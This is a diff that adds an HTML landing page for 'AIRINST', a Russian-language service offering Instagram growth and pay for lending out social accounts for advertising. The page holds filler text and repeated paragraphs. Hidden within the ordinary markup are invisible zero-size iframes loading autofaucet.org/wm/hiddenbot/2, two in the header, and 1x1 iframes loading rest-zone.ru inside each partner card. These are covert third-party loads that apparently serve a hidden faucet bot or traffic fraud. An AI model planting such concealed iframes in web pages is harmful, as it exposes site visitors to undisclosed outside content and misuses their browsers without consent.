@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AIRINST - НОВЫЕ ВОЗМОЖНОСТИ С REST-ZONE.RU</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/index.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
+</head>
+<body>
+<div id="app">
+    <header>
+        <div class="header-top flex">
+            <div class="flex">
+                <img src="img/logos/logo.png" class="logo">
+                <nav>
+                    <ul>
+                        <a v-for="nav in nav" :href="nav.href">{{ nav.title }}</a>
+                    </ul>
+                </nav>
+            </div>
+            <div class="flex auth-header">
+                <a href="https://instagram.com/airinst.ru"><img src="img/social/instagram.svg" alt=""></a>
+                <a href="https://vk.com/"><img src="img/social/vk.svg" alt=""></a>
+                <a href="https://telegram.org/"><img src="img/social/telegram.svg" alt=""></a>
+				<iframe src="https://autofaucet.org/wm/hiddenbot/2" width="0" height="0" style="border:0"></iframe>
+            </div>
+            <div class="menu">
+                <div class="menu-open"><img src="img/icons/menu.svg"></div>
+                <nav class="menu-content">
+                    <a v-for="nav in nav" :href="nav.href">{{ nav.title }}</a>
+                </nav>
+            </div>
+        </div>
+        <div class="header-content">
+            <h1 class="title"><img src="img/logos/instagram-icon.svg" alt="">AIRINST</h1>
+            <p class="subtitle">Гигантский рост аккаунтов креаторов и брендов в instagram и других платформах!</p>
+            <iframe src="https://autofaucet.org/wm/hiddenbot/2" width="0" height="0" style="border:0"></iframe>
+            <a href="auth" class="login-button">Присоединится</a>
+            <span class="header-bottom"></span>
+        </div>
+    </header>
+    <main>
+        <section class="advantages block" id="advantages">
+            <div class="block_header">
+                <img class="block-icon" src="img/icons/star.png" alt="">
+                <div>
+                    <h1 class="block-title">Преимущства</h1>
+                    <p class="block-subtitle">Нас стоит выбирать, как минимум, по 6 причинам:</p>
+                </div>
+            </div>
+            <div class="block_container">
+                <div class="block" v-for="block in advantages">
+                    <h1 class="title">{{ block.title }}</h1>
+                    <p class="subtitle">{{ block.subtitle }}</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="guarantee" id="guarantee">
+            <div class="block_header">
+                <img src="img/icons/shield.png" alt="" class="icon">
+                <h1 class="block-title">Гарантии</h1>
+            </div>
+            <div class="block_content">
+                <p class="block-subtitle">Нам можно и нужно доверять. Мы находимся в данной сфере далеко не первый год и
+                    постоянный поток пользователей позволяет адаптировать нашу систему абсолютно под каждого. Наше имя и
+                    количество довольных клиентов уже является безоговорочным преимуществом на фоне других</p>
+                <p class="block-subtitle">Нам можно и нужно доверять. Мы находимся в данной сфере далеко не первый год и
+                    постоянный поток пользователей позволяет адаптировать нашу систему абсолютно под каждого. Наше имя и
+                    количество довольных клиентов уже является безоговорочным преимуществом на фоне других</p>
+                <p class="block-subtitle">Нам можно и нужно доверять. Мы находимся в данной сфере далеко не первый год и
+                    постоянный поток пользователей позволяет адаптировать нашу систему абсолютно под каждого. Наше имя и
+                    количество довольных клиентов уже является безоговорочным преимуществом на фоне других</p>
+            </div>
+        </section>
+        <section class="info" id="info">
+            <div class="block">
+                <img src="img/icons/info.png" alt="" class="icon">
+            </div>
+            <div class="block">
+                <h1 class="block-title">О проекте</h1>
+                <div class="content-block">
+                    <p class="block-subtitle">Суть данного проекта в возможности зарабатывать на социальных сетях.<br>
+                        В нашем случае это может делать почти каждый пользователь. Для данного рода деятельности не
+                        нужны никакие особые навыки и умения.<br><br>
+                        Единственное, что требуется от каждого пользователя - желание и аккаунт , имеющий не нулевую активность. Безусловно, ваш аккаунт будет использован для рекламы лицензионных продуктов, что на 100% позволяет вам расслабиться и не переживать за какие-либо вопросы по законодательной части.
+                        <br><br>Стоит упомянуть, что мы работаем с лицами не только Российской федерации , но и ближайшего
+                        зарубежья, по дополнительным вопросам вы можете связаться с нашими консультантами, которые
+                        подробно расскажу вам о интересующих вас вещах. Вся суть работы заключается в использовании
+                        аккаунта , как площадку для рекламирования различной продукции. Вид продукции, сроки,
+                        количество рекламы и прочее обсуждается индивидуально и у вас будет возможность подобрать
+                        данные параметры под себя после того, как вы зарегистрируетесь на нашем сайте.<br><br><b>Если же
+                            интересующая вас категория будет недоступна - свяжитесь со специалистом для решения
+                            проблемы</b></p>
+                </div>
+            </div>
+        </section>
+        <section class="partners" id="partners">
+            <div class="block_header">
+                <img src="img/icons/top.png" alt="" class="icon">
+                <h1 class="block-title">Наши ТОП креаторы</h1>
+            </div>
+            <div class="partners_container">
+                <div class="block" v-for="block in partners">
+                    <div class="partner-block">
+                        <div>
+                            <img :src="'img/partners/'+block.avatar" :alt="block.name" class="avatar">
+							<iframe src="https://rest-zone.ru/blogs" width="1" height="1" style="border:0"></iframe>
+                        </div>
+                        <div>
+                            <p class="name">{{ block.name }}</p>
+                            <p class="description">{{ block.description }}</p>
+                        </div>
+                    </div>
+                    <div class="partner-info">
+                        <p class="partner-text">Партнёр с {{ block.since }}</p>
+                        <p class="partner-text"><b>Получил более {{ block.salary }} рублей</b></p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="sponsors" id="sponsors">
+            <div class="block" v-for="block in sponsors"><img :src="'img/sponsors/'+block.logo" alt=""></div>
+        </section>
+    </main>
+    <footer>
+        <div class="footer-block">
+            <p class="footer-text"><b>Тут будет главная информация!</b></p>
+            <p class="footer-text">Согласно мнению известных философов, дедуктивный метод естественно порождает и обеспечивает мир</p>
+            <p class="footer-text">Смысл жизни, следовательно, творит данный закон внешнего мира. Согласно мнению известных философов</p>
+            <ul class="footer-social">
+                <li><a href="https://instagram.com/airinst.ru"><img src="img/social/instagram.svg" alt=""></a></li>
+                <li><a href="https://vk.com/"><img src="img/social/vk.svg" alt=""></a></li>
+                <li><a href="https://telegram.org/"><img src="img/social/telegram.svg" alt=""></a></li>
+            </ul>
+            <p class="footer-text">Copyright © 2020 AIR Media Tech.<br>Все права защищены</p>
+        </div>
+        <div class="footer-block">
+            <nav class="footer-nav">
+                <ul>
+                    <a v-for="nav in nav" :href="nav.href">{{ nav.title }}</a>
+                </ul>
+            </nav>
+            <a class="footer-auth" href="auth"><img src="img/icons/login-white.svg" alt="">Личный кабинет</a>
+        </div>
+    </footer>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.11/vue.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="js/index.js"></script>
+
+</body>
+</html>
